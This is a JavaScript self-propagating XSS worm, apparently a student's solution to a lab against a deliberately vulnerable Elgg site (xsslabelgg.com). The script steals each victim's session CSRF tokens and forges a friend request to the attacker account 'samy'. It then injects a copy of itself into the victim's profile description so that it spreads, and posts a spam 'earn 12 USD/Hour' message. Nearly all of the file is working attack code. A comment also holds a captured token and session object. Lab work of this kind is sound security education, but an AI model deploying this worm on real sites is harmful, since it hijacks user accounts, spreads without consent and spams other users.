<script type="text/javascript" id="worm">


    window.onload = function () 
    {
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        var thisprofilename=elgg.session.user.username;
        //Construct the HTTP request to add Samy as a friend.


//         At first wormcode was constructed using the code given in the cheetsheet.
// I just needed to pipeline task 1,2 and 3 .With a little change in the task 2 code part,

// In that part , I changed the content to contain wormcode.

// The rest was as same as previous ones.
    
        if(thisprofilename!="samy")
        {
            var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token; //FILL IN
    
    
        // http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624188449&__elgg_token=pjGWyXpTvM3N4OrLxPKcQg&__elgg_ts=1624188449&__elgg_token=pjGWyXpTvM3N4OrLxPKcQg
        //Create and send Ajax request to add friend
    
        //var elgg = {"config":{"lastcache":1549469404,"viewtype":"default","simplecache_enabled":1},"security":{"token":{"__elgg_ts":1624188449,"__elgg_token":"pjGWyXpTvM3N4OrLxPKcQg"}},"session":{"user":{"guid":44,"type":"user","subtype":"","owner_guid":44,"container_guid":0,"site_guid":1,"time_created":"2017-07-26T20:29:47+00:00","time_updated":"2017-07-26T20:29:48+00:00","url":"http:\/\/www.xsslabelgg.com\/profile\/alice","name":"Alice","username":"alice","language":"en","admin":false},"token":"ciCJlRtwRNz2GFwjM9VI3l"},"_data":{},"page_owner":{"guid":47,"type":"user","subtype":"","owner_guid":47,"container_guid":0,"site_guid":1,"time_created":"2017-07-26T20:30:59+00:00","time_updated":"2021-06-20T10:38:29+00:00","url":"http:\/\/www.xsslabelgg.com\/profile\/samy","name":"Samy","username":"samy","language":"en"}};
            Ajax=new XMLHttpRequest();
            Ajax.open("GET",sendurl,true);
            Ajax.setRequestHeader("Host","www.xsslabelgg.com");
            Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
            Ajax.send();
    
        }
        

        //task 1 er shesh



        var name=elgg.session.user.name;
        if(name!="Samy")
        {
            var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
            var token="&__elgg_token="+elgg.security.token.__elgg_token;
            var guid=elgg.session.user.guid;

            var description="&description=" + wormCode
    
            var sendurl="http://www.xsslabelgg.com/action/profile/edit";
    
            var content=token+ts+name+description+"&guid="+guid;
    
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.xsslabelgg.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
    
    
        }

        //task 2 ses

        var name=elgg.session.user.name;
        if(name!="Samy")
        {
            var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
            var token="&__elgg_token="+elgg.security.token.__elgg_token;
          
            var body="&body=To earn 12 USD/Hour(!), visit now "+"http://www.xsslabelgg.com/profile/samy";
    
            var sendurl="http://www.xsslabelgg.com/action/thewire/add";
    
            var content=token+ts+body;
    
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST",sendurl,true);
            Ajax.setRequestHeader("Host","www.xsslabelgg.com");
            Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
            Ajax.send(content);
    
    
        }

    }
    
</script>